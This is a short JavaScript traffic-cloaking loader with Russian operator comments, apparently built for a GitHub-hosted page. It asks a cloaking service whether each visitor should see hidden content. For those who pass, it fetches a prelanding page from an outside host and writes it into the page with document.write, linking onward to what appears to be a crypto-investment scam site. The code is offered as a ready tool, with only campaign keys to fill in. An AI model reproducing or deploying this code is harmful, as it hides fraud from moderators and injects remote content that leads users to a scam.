var binomCampaingKey = 's15yun0z67b7t9btickt'; /* Key кампании в Binom. Не ID! Узнать key нужной кампании можно в настройках этой кампании. Вот здесь - http://prntscr.com/qua54o  */
var gitHubId = 'denis8854'; /*ID данного GitHub сайта. Только ID, не вся ссылка!*/
var landingUrl = 'https://serd.site/landing/xhr/mobile_final/latam.php'; /*Адрес преленда, который необходимо подгрузить*/
var moneyPageUrl = 'https://cl.bitcoincircuit.online'; /*Адрес манипейдж, который будет подставлен в ссылки на преленде*/
var landignLoadingCampaingId = '2dpmfzy61v5pcfgkk3ew'; /*Key кампании в Binom, в которой будут отображатся логи при загрузке преленда девайсом юзера. Служит для отслеживания потери трафика. По умолчанию стоит стандартная кампания GLOBAL Landing Loading, id:167*/

/* БОЛЬШЕ НИЧЕГО НЕ МЕНЯТЬ!*/

var landing = landingUrl + '?mpurl=' + moneyPageUrl + '&githubid=' + gitHubId + '&landingloadingid=' + landignLoadingCampaingId; 

var url = 'https://cloak.site/binom/?bckey='+binomCampaingKey;
var xhr = new XMLHttpRequest();
var cloakResult = 'no';

xhr.open('GET', url, false);
xhr.send();

if (xhr.status == 200) {
  cloakResult = xhr.responseText;
} 

if(cloakResult=="yes"){
var xhrLand = new XMLHttpRequest();
var landingCode = '';

xhrLand.open('GET', landing, false);
xhrLand.send();

if (xhrLand.status == 200) {
  landingCode = xhrLand.responseText;
} 

document.write(landingCode);

}
